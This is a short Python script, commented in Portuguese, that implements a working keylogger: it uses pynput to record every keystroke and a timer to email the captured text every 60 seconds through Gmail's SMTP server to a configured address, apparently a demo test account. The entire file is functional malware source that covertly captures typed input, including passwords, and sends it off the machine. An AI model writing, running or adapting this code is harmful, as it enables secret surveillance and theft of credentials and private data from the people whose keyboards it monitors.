from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log = ""

# Configuração de e-mail
EMAIL_ORIGEM = "demokeylogger0@gmail.com" # e-mail criado para testes
EMAIL_DESTINO = "demokeylogger0@gmail.com" # e-mail criado para testes podendo ser diferente
SENHA_EMAIL = "senha criada no google account atravé do link acima"

def enviar_email():
	global log
	if not log:
		Timer(60, enviar_email).start()
		return

	msg = MIMEText(log)
	msg['Subject'] = "Dados capturados pelo keylogger"
	msg['From'] = EMAIL_ORIGEM
	msg['To'] = EMAIL_DESTINO

	try:
		server = smtplib.SMTP("smtp.gmail.com", 587)
		server.starttls()
		server.login(EMAIL_ORIGEM, SENHA_EMAIL)
		server.send_message(msg)
		server.quit()
	except Exception as e:
		print("Erro ao enviar", e)

	log = ""
	Timer(60, enviar_email).start()

def on_press(key):
	global log
	try:
		log += key.char
	except AttributeError:
		if key == keyboard.Key.space:
			log += " "
		elif key == keyboard.Key.enter:
			log += "\n"
		elif key == keyboard.Key.backspace:
			log += "[<]"
		else:
			pass # ignorar control, shift, etc

# inicia o Keylogger e o envio automatico
with keyboard.Listener(on_press=on_press) as listener:
	enviar_email()
	listener.join()
